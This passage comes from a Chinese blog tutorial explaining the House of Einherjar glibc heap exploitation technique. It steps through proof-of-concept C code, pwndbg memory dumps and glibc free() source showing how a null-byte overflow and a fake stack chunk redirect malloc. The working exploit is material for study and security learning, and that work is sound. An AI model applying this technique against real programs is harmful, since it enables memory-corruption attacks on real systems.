fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to</span></span><br><span class="line"><span class="comment">//do two things:</span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control.</span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test.</span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)d == (<span class="keyword">long</span>)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意看一下注释，这种攻击方式是有条件的。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>在 POC 中已经说明了条件：</p><ol><li>程序具有 off-by-one 漏洞、堆溢出漏洞或其他方式可以修改下一个堆块相邻的 mchunk_size 和 mchunk_prev_size。</li><li>在小于 glibc 2.27 或 glibc 未开启 tcache 的版本中全部适用</li><li>在大于等于 glibc 2.27 版本中之后的 b 堆块的大小需要超过 0x408（也就是 b 堆块被释放后不能进入 tcachebin 中）</li></ol><h2 id="POC-解析"><a href="#POC-解析" class="headerlink" title="POC 解析"></a>POC 解析</h2><p>现在来分析一下 POC 吧，首先我们先 malloc(0x38)：（b 36-&gt;r）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 18.04.4 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"><span class="comment">//Welcome to House of Einherjar!</span></span><br><span class="line"><span class="comment">//Tested in Ubuntu 18.04.4 64bit.</span></span><br><span class="line"><span class="comment">//This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.</span></span><br><span class="line"><span class="comment">//This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//We allocate 0x38 bytes for &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">//a: 0x555555757260</span></span><br><span class="line"><span class="comment">//Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">100</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="meta">#a--malloc(0x38)</span></span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020d71</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><blockquote><p>malloc_usable_size：获取分配后 chunk 的 user data 大小，free 后 malloc_usable_size 会返回 0</p></blockquote><p>然后我们在 stack 上伪造一个 fake chunk（b 62-&gt; c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//We create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack</span></span><br><span class="line"><span class="comment">//However, you can also create the chunk in the heap or the bss, as long as you know its address</span></span><br><span class="line"><span class="comment">//We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span></span><br><span class="line"><span class="comment">//(although we could do the unsafe unlink technique here in some scenarios)</span></span><br><span class="line"><span class="comment">//Our fake chunk at 0x7fffffffdda0 looks like:</span></span><br><span class="line"><span class="comment">//prev_size (not used): 0x100</span></span><br><span class="line"><span class="comment">//size: 0x100</span></span><br><span class="line"><span class="comment">//fwd: 0x7fffffffdda0</span></span><br><span class="line"><span class="comment">//bck: 0x7fffffffdda0</span></span><br><span class="line"><span class="comment">//fwd_nextsize: 0x7fffffffdda0</span></span><br><span class="line"><span class="comment">//bck_nextsize: 0x7fffffffdda0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx fake_chunk</span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0x0000000000000100</span> #fake_chunk</span><br><span class="line">#fake_mchunk_prev_size #fake_mchunk_size</span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span></span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span></span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span></span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这个 fake_chunk 的各个指针也不是乱来的啊，<del>它是有备而来</del>，这个问题之后再说。<br>接下来我们再次 malloc 一个堆块，之前在开头说过如果系统开启了 tcache 机制，则其 malloc 大小要超过 0x408（b 68 -&gt; c），这里我们选择 malloc 大小为 0x4f8 的堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x4f8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"><span class="comment">//We allocate 0x4f8 bytes for &#x27;b&#x27;.</span></span><br><span class="line"><span class="comment">//b: 0x5555557572a0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="meta">#a--malloc(0x38)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> <span class="meta">#b--malloc(0x4f8)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757790</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>为了方便展示 b chunk 的大小，这里 POC 选择创建了一个指针指向 b chunk 的 mchunk_size（b 72-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="comment">//b.size: 0x501</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="meta">#a--malloc(0x38)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> <span class="meta">#b--malloc(0x4f8)</span></span><br><span class="line">    #b_size_ptr==<span class="number">0x555555757298</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757790</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来就是漏洞的所在之处，假如说现在有一个堆溢出漏洞或 off-by-one 漏洞可以修改 b chunk 的 mchunk_size 和 mchunk_prev_size（b 91-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x500) | prev_inuse = 0x501\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line">a[real_a_size] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"><span class="comment">//We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk</span></span><br><span class="line"><span class="comment">//Our fake prev_size will be 0x555555757290 - 0x7fffffffdda0 = 0xffffd555557594f0</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="meta">#a--malloc(0x38)</span></span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0xffffd555557594f0</span><span class="number">0x0000000000000500</span> <span class="meta">#b--malloc(0x4f8)</span></span><br><span class="line">    <span class="meta">#changed   #0x0000000000000501 <span class="comment">/* VULNERABILITY */</span></span></span><br><span class="line">       #b_size_ptr==<span class="number">0x555555757298</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757790</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这里来看一下为什么我们要将 b 堆块的 mchunk_prev_size，之前我们在 stack 上伪造了一个 fake_chunk，换句话说我们想要控制这个地址，这个 fake_chunk 的地址为 0x7fffffffdda0，现在 b 堆块的<strong>起始</strong>地址为 0x555555757290，因为我们在之后的 free 过程中想使用 b 堆块的 mchunk_prev_size 进行与 fake_chunk 进行合并，因此这里需要计算两者的距离。<br>接下来设置 fake chunk 的 mchunk_size，这个的设置是必须的，原因之后再说 b 95-&gt;c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx fake_chunk</span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0xffffd555557594f0</span> #fake_chunk</span><br><span class="line"><span class="meta">#changed</span></span><br><span class="line">#fake_mchunk_prev_size #fake_mchunk_size</span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span> #这些内存不重要</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来到了重点，我们重点来看这个 free 函数，b 97-&gt;c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>这里引入 malloc 源码进行调试：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620831515630-d85972f1-8400-4393-b90b-d25289d7cb57.png#clientId=u5fb3c5cf-52e3-4&from=drop&id=u91745094&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-12%2022.58.29.png&originHeight=1800&originWidth=2880&originalType=binary&size=559375&status=done&style=none&taskId=ua0d349e8-5dcb-43f3-ae8d-5f69d77af7c" alt="截屏2021-05-12 22.58.29.png"><br>重要检查源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   nextchunk = chunk_at_offset(p, size); <span class="comment">//nextchunk==0x555555757790</span></span><br><span class="line"><span class="comment">//0x555555757290+0x500==0x555555757790（这个地址是top_chunk的起始地址）</span></span><br><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top)) <span class="comment">//检查p堆块是否为top_chunk</span></span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>)) <span class="comment">//判断nextchunk是否超出heap区</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) <span class="comment">//检查nextchunk的PREV_INUSE是否为1</span></span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">   nextsize = chunksize(nextchunk); <span class="comment">//nextsize==0x20871</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">//检查nextchunk大小的有效性</span></span><br><span class="line">     malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后就是下面这些内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//prev_inuse(p)==0</span></span><br><span class="line">    <span class="comment">//进入向后合并</span></span><br><span class="line">  prevsize = prev_size (p); <span class="comment">//prevsize==0xffffd555557594f0</span></span><br><span class="line">  size += prevsize; <span class="comment">//size==size+prevsize==0xffffd555557594f0+0x500==0xffffd555557599f0</span></span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span 